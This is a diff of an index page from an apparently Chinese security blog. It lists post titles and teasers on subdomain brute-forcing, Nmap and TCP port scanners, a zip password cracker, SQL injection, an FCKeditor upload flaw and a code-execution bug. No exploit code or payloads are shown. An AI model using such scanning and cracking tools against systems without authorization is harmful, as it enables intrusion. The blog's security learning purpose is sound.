+<p>本文作者：Sofia @ 邮箱 , 个人主页<br>版权声明：除非本文有注明出处，否则转载请注明本文来自 <a href="http://www.vuln.cn" target="_blank" rel="external">http://www.vuln.cn</a><br>本文地址：<a href="http://www.vuln.cn/?p=1992" target="_blank" rel="external">http://www.vuln.cn/?p=1992</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/12/Python工具之二级域名爆破/" itemprop="url">
+                  Python工具之二级域名爆破
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-12T11:15:14+08:00" content="2016-11-12">
+              2016-11-12
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/12/Python工具之二级域名爆破/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/12/Python工具之二级域名爆破/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/12/Python工具之二级域名爆破/" class="leancloud_visitors" data-flag-title="Python工具之二级域名爆破">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>二级域名爆破的小工具~要有二级域名的字典偶~<br>字典小编就不提供啦~<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/11/12/Python工具之二级域名爆破/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/12/Python工具之爬虫/" itemprop="url">
+                  Python工具之爬虫
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-12T11:14:59+08:00" content="2016-11-12">
+              2016-11-12
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/12/Python工具之爬虫/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/12/Python工具之爬虫/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/12/Python工具之爬虫/" class="leancloud_visitors" data-flag-title="Python工具之爬虫">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>这里小编展示三个爬虫的例子<br>1.爬取补天厂商列表<br>2.爬取网易新闻排行榜<br>3.爬取图片<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/11/12/Python工具之爬虫/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/07/Python工具之Nmap端口扫描器/" itemprop="url">
+                  Python工具之Nmap端口扫描器
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-07T15:55:16+08:00" content="2016-11-07">
+              2016-11-07
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/07/Python工具之Nmap端口扫描器/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/07/Python工具之Nmap端口扫描器/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/07/Python工具之Nmap端口扫描器/" class="leancloud_visitors" data-flag-title="Python工具之Nmap端口扫描器">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>只能进行TCP连接扫描的脚本有些不实用,因为我们可能还要进行其他类型的扫描,如ACK,FIN等.所以升级了我们的端口扫描器,使用nmap进行端口扫描.<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/11/07/Python工具之Nmap端口扫描器/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/07/Python工具之TCP全连接端口扫描器/" itemprop="url">
+                  Python工具之TCP全连接端口扫描器
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-07T15:54:52+08:00" content="2016-11-07">
+              2016-11-07
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/07/Python工具之TCP全连接端口扫描器/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/07/Python工具之TCP全连接端口扫描器/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/07/Python工具之TCP全连接端口扫描器/" class="leancloud_visitors" data-flag-title="Python工具之TCP全连接端口扫描器">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>使用TCP全连接扫描来识别主机的TCP端口扫描器</p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/11/07/Python工具之TCP全连接端口扫描器/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/11/07/Python工具之zip文件口令破解机/" itemprop="url">
+                  Python工具之zip文件口令破解机
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-11-07T15:54:28+08:00" content="2016-11-07">
+              2016-11-07
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/11/07/Python工具之zip文件口令破解机/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/07/Python工具之zip文件口令破解机/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/11/07/Python工具之zip文件口令破解机/" class="leancloud_visitors" data-flag-title="Python工具之zip文件口令破解机">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>zip文件口令破解,可以指定文件名和密码字典<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/11/07/Python工具之zip文件口令破解机/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/11/06/sql注入之oracle/" itemprop="url">
                   未命名
                 </a>
@@ -372,8 +1810,8 @@
             
               
                 
-                <a class="post-title-link" href="/2015/03/15/sql注入之mysql/" itemprop="url">
-                  SQL注入之MySQL注入
+                <a class="post-title-link" href="/2016/10/31/文件上传漏洞之FCK编辑器/" itemprop="url">
+                  文件上传漏洞之FCK编辑器
                 </a>
               
             
@@ -386,19 +1824,38 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-03-15T22:45:55+08:00" content="2015-03-15">
-              2015-03-15
+            <time itemprop="dateCreated" datetime="2016-10-31T14:39:01+08:00" content="2016-10-31">
+              2016-10-31
             </time>
           </span>
 
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
           
 
           
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2015/03/15/sql注入之mysql/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/03/15/sql注入之mysql/" itemprop="commentsCount"></span>
+                <a href="/2016/10/31/文件上传漏洞之FCK编辑器/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/31/文件上传漏洞之FCK编辑器/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -408,7 +1865,7 @@
 
           
           
-             <span id="/2015/03/15/sql注入之mysql/" class="leancloud_visitors" data-flag-title="SQL注入之MySQL注入">
+             <span id="/2016/10/31/文件上传漏洞之FCK编辑器/" class="leancloud_visitors" data-flag-title="文件上传漏洞之FCK编辑器">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -431,9 +1888,9 @@
 
       
         
-          <h1 id="SQL注入之MySQL注入"><a href="#SQL注入之MySQL注入" class="headerlink" title="SQL注入之MySQL注入"></a>SQL注入之MySQL注入</h1><h2 id="MySQL的相关知识"><a href="#MySQL的相关知识" class="headerlink" title="MySQL的相关知识"></a>MySQL的相关知识</h2><p>在我们所用数据库，MySQL作为中小型企业和个人用户所使用的的代表，作用是不可替代的。sqlServer无法在其他平台上使用，Oracle的又非常的昂贵。而MySQL由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。<br>
+          <p>fckeditor Version &lt;=2.4.2 For php 公开漏洞</p>
           <div class="post-more-link text-center">
-            <a class="btn" href="/2015/03/15/sql注入之mysql/#more" rel="contents">
+            <a class="btn" href="/2016/10/31/文件上传漏洞之FCK编辑器/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -484,8 +1941,8 @@
             
               
                 
-                <a class="post-title-link" href="/2015/03/11/sql注入之sqlserver/" itemprop="url">
-                  SQL注入之sqlserver注入
+                <a class="post-title-link" href="/2016/10/30/代码执行漏洞之站长工具/" itemprop="url">
+                  代码执行漏洞之站长工具
                 </a>
               
             
@@ -498,8 +1955,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-03-11T23:51:55+08:00" content="2015-03-11">
-              2015-03-11
+            <time itemprop="dateCreated" datetime="2016-10-30T20:42:08+08:00" content="2016-10-30">
+              2016-10-30
             </time>
           </span>
 
@@ -512,8 +1969,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
                   </a>
                 </span>
 
@@ -528,8 +1985,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2015/03/11/sql注入之sqlserver/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/03/11/sql注入之sqlserver/" itemprop="commentsCount"></span>
+                <a href="/2016/10/30/代码执行漏洞之站长工具/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/30/代码执行漏洞之站长工具/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -539,7 +1996,7 @@
 
           
           
-             <span id="/2015/03/11/sql注入之sqlserver/" class="leancloud_visitors" data-flag-title="SQL注入之sqlserver注入">
+             <span id="/2016/10/30/代码执行漏洞之站长工具/" class="leancloud_visitors" data-flag-title="代码执行漏洞之站长工具">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -562,681 +2019,9 @@
 
       
         
-          <h1 id="SQL注入之sqlserver注入"><a href="#SQL注入之sqlserver注入" class="headerlink" title="SQL注入之sqlserver注入"></a>SQL注入之sqlserver注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入漏洞（SQL injection）是Web层面最高危的漏洞之一。在2008年至2010年期间，SQL连续3年在OWASP年度十大漏洞排行中排名第一。随着Web应用程序安全性不断提高，SQL注入漏洞逐渐减少，同时也变得更加难以检测与利用。<br>最近打算将sqlserver、mysql，oracle的手工注入以及sqlmap的使用方法写成一个系列，便于自己回忆总结，也方便大家学习。此文主要讲SQL注入的原理及sqlserver的注入技巧。<br>
+          <p>站长工具源码出现代码执行漏洞<br>
           <div class="post-more-link text-center">
-            <a class="btn" href="/2015/03/11/sql注入之sqlserver/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2014/12/25/Web踩点/" itemprop="url">
-                  Web安全之踩点思路
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2014-12-25T22:36:29+08:00" content="2014-12-25">
-              2014-12-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2014/12/25/Web踩点/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2014/12/25/Web踩点/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2014/12/25/Web踩点/" class="leancloud_visitors" data-flag-title="Web安全之踩点思路">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="Web踩点"><a href="#Web踩点" class="headerlink" title="Web踩点"></a>Web踩点</h1><h2 id="一、什么是踩点"><a href="#一、什么是踩点" class="headerlink" title="一、什么是踩点"></a>一、什么是踩点</h2><p>对白帽子来说，在开始真正渗透之前，必须完成渗透前的信息收集，收集的第一步就是踩点。彩电就是对指定目标进行系统的网站信息收集，攻击者将尽可能多的收集目标单位的安全情况的方方面面。最后就可以得到一个独特的足迹。</p>
-<p>因为数据的大量泄漏加上上网的群众大都不注重自己的信息保密，导致只要想查，任何人都可以从公开渠道查到很多，其数量之多绝对会让你们大吃一惊。</p>
-<p>总之：成功的攻击者需要这样，他们必须收集大量的信息，以便集中火力进行外科手术式攻击（这种攻击不会轻易被捉住）<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2014/12/25/Web踩点/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2014/12/23/kalilivaupan/" itemprop="url">
-                  U盘制作kali live
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2014-12-23T00:51:20+08:00" content="2014-12-23">
-              2014-12-23
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/kali/" itemprop="url" rel="index">
-                    <span itemprop="name">kali</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2014/12/23/kalilivaupan/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2014/12/23/kalilivaupan/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2014/12/23/kalilivaupan/" class="leancloud_visitors" data-flag-title="U盘制作kali live">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="KALI-LIVE安装到U盘"><a href="#KALI-LIVE安装到U盘" class="headerlink" title="KALI LIVE安装到U盘"></a>KALI LIVE安装到U盘</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本方法不适用于uefi启动的电脑，uefi引导系统使用U盘kali的方法暂时还没解决。如果有人知道麻烦告诉我下。。。</p>
-<p>因为自己电脑现在就一个盘，而且只有128g，没法做成双系统，而且非常不够用，所以想到了用U盘制作kali。。。kali自带的kali live安装到U盘后不能保存修改内容，于是便打算试试制作一个可以保存修改内容的kali live，网上找了好多办法最后终于成功了，分享下。。。<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2014/12/23/kalilivaupan/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2014/11/23/port22and3389nmap/" itemprop="url">
-                  Nmap自动扫描shell
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2014-11-23T23:36:20+08:00" content="2014-11-23">
-              2014-11-23
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2014/11/23/port22and3389nmap/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2014/11/23/port22and3389nmap/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2014/11/23/port22and3389nmap/" class="leancloud_visitors" data-flag-title="Nmap自动扫描shell">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="Nmap自动扫描shell"><a href="#Nmap自动扫描shell" class="headerlink" title="Nmap自动扫描shell"></a>Nmap自动扫描shell</h1><p>刚写了Nmap的使用和原理，发现一步一步操作很是麻烦，便写了一个Nmap自动扫描22端口和3389端口的shell。分享出来给大家看下，如果有什么改进的地方欢迎指出。<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2014/11/23/port22and3389nmap/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2014/11/23/nmap/" itemprop="url">
-                  Nmap 原理简单介绍和应用
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2014-11-23T22:57:45+08:00" content="2014-11-23">
-              2014-11-23
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2014/11/23/nmap/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2014/11/23/nmap/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2014/11/23/nmap/" class="leancloud_visitors" data-flag-title="Nmap 原理简单介绍和应用">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
